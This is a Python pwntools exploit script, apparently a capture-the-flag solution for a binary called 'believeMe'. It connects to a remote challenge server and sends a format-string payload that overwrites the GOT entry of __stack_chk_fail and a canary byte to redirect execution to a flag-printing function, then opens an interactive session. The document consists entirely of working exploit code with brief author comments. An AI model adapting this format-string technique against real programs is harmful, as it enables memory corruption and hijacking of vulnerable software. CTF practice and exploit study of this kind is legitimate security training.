#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
local =0 


if local:
    io = process('./believeMe')
    raw_input("debug -> ")
    # gdb.attach(io, 'b * 0x80487cc')    
    
else:
    io = remote('18.223.228.52', 13337)
    
elf = ELF('./believeMe')
target = elf.sym['noxFlag']
# 08 04 86 7b
# 7b 86 04 08
# plt seg belongs to code seg, has no right to write
# fflush_plt = elf.plt['fflush']
# 0x804 84d0
# payload = p32(fflush_plt) + '%' + str((target & 0xffff)-4) + 'c%9$hn'
stack_fail = elf.got['__stack_chk_fail']
canary = 0xffffdd0c
payload = p32(stack_fail) + p32(canary)+ '%' + str((target & 0xffff) - 8) + 'c%9$hn%10$hhn'




io.recvuntil('????')
io.sendline(payload)
io.interactive()
io.close()
